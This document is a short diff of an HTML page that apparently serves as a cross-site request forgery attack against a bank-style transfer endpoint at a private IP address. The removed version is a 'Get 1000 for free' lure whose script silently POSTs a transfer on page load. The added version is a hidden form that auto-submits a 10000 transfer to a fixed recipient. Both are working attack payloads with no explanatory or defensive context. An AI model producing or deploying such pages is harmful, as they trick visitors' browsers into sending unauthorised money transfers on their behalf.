@@ -1,32 +1,11 @@
-<!DOCTYPE html>
 <html>
   <head>
-    <title>Get 1000 for free</title>
+    <title>Fake Form</title>
   </head>
-  <body>
-    <p>Get 1000 for free</p>
-    <p>I could give you an idea.</p>
-    
-    <script>
-      window.addEventListener('load', function() {
-        const payload = {
-          "user_to": "send@gmail.com",
-          "amount": "1000"
-        };
-        
-        fetch("http://192.168.2.98:55824/transfer", {
-          method: "POST",
-          body: JSON.stringify(payload),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        }).then(response => {
-          console.log("Request sent successfully!");
-        }).catch(error => {
-          console.error("Error sending request:", error);
-        });
-      });
-    </script>
+  <body onload="document.bank_form.submit()">
+    <form action="http://192.168.2.98:55824/transfer" method="POST" name="bank_form" style="display: none;">
+      <input type="text" name="user_to" value="send@gmail.com" />
+      <input type="text" name="amount" value="10000" />
+    </form>
   </body>
 </html>
-
